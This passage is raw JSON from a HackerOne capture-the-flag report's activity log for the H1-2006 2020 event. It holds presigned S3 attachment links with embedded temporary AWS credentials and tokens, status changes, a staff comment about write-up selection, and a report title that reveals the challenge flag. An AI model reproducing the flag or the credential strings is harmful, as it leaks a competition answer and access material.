-west-2-production-attachments.s3.us-west-2.amazonaws.com/YjDL6Ug1BbMLoYzo28yEcHkg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_5.29.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_5.29.03_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=60916939a32bbf7bdc570b000fce6dd1189cfc907b95ac583e2b0d2e63d0ce31"},{"id":857588,"filename":"classic-1-black_1024x768.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NjkajZ78MPTkv6QWP7zii36A?response-content-disposition=attachment%3B%20filename%3D%22classic-1-black_1024x768.jpg%22%3B%20filename%2A%3DUTF-8%27%27classic-1-black_1024x768.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=d01cd5137426b90086c3cf7d865841fa74219db8f074e1a14aeae31ff5850345"},{"id":857587,"filename":"pwn.mp4","type":"video/mp4","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vMYN5m529gvq27oVHfq2E9AG?response-content-disposition=attachment%3B%20filename%3D%22pwn.mp4%22%3B%20filename%2A%3DUTF-8%27%27pwn.mp4\u0026response-content-type=video%2Fmp4\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070629Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026X-Amz-Signature=5f87662be05c48ffa95cc6ae5c11041f47fa4a64ee6e1a3ff0a104f8b5c27972"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8236719,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:03:33.954Z","updated_at":"2020-06-08T21:03:33.954Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8236835,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-08T21:15:51.687Z","updated_at":"2020-06-08T21:15:51.687Z","additional_data":{"old_title":"^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$","new_title":"[H1-2006 2020]  ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$"},"actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8268341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\n\nWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!\n\nIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!","markdown_message":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eI wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!\u003c/p\u003e\n\n\u003cp\u003eWe will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we\u0026#39;ll make sure to let you know when you can publish them on your site!\u003c/p\u003e\n\n\u003cp\u003eIf you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-11T23:03:29.616Z","updated_at":"2020-06-11T23:03:29.616Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8324949,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you again for participating in the #h12006 CTF! ","markdown_message":"\u003cp\u003eThank you again for participating in the #h12006 CTF! \u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-17T22:27:59.016Z","updated_at":"2020-06-17T22:27:59.016Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"pirateducky","url":"/pirateducky"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8331796,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T13:36:17.948Z","updated_at":"2020-06-18T13:36:17.948Z","first_to_agree":true,"actor":{"username":"pirateducky","cleared":false,"url":"/pirateducky","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/266/095/949ef99b936641cccafd7d5cfd5082c09f6dd085_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8332733,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:24:52.386Z","updated_at":"2020-06-18T15:24:52.386Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8332734,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-18T15:24:52.453Z","updated_at":"2020-06-18T15:24:52.453Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}